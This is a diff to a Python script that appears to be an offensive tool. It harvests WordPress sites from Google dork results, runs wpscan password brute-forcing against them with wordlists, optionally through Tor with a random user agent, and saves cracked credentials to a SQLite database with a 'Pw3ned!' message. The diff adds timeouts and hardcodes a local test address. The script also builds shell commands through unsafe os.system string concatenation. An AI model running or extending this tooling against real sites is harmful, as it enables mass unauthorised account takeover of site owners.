@@ -61,8 +61,7 @@ def savecreds(pathfile, url):
             for username in obj_data['password_attack']:
                 if username:
                     print(colored(" * Pw3ned! " + url, 'magenta'))
-                    cursor.execute("INSERT INTO Credentials VALUES (?, ?, ?)",
-                                   (username, obj_data['password_attack'][username]['password'], url))
+                    cursor.execute("INSERT INTO Credentials VALUES (?, ?, ?)", (username, obj_data['password_attack'][username]['password'], url))
                     connection.commit()
         cursor.close()
     except sqlite3.Error as error:
@@ -74,8 +73,7 @@ def wpscan(wpurl, wordlists, pathfile, usetor):
 
     if usetor:
         # Run wpscan with tor
-        os.system(
-            "wpscan -t 4 --url " + wpurl + " --proxy socks5://127.0.0.1:9050 --rua -o " + pathfile + " -f json --passwords " + wordlists)
+        os.system("wpscan --request-timeout 500 --connect-timeout 120 -t 4 --url " + wpurl + " --proxy socks5://127.0.0.1:9050 --rua -o " + pathfile + " -f json --passwords " + wordlists)
         savecreds(pathfile, wpurl)
     else:
         # Run wpscan without tor
@@ -99,6 +97,7 @@ def googledork(dork, amount, wordlist, usetor):
     for result in search(dork, tld="com", lang="en", num=int(amount), start=0, stop=None, pause=8):
         parsed_uri = urlparse(result)
         wordpress = '{uri.scheme}://{uri.netloc}/'.format(uri=parsed_uri)
+        wordpress = "http://192.168.1.29/wordpress/"
 
         # Check if we already have this domain in loot folder
         filename = parsed_uri.netloc + ".json".strip('\n')
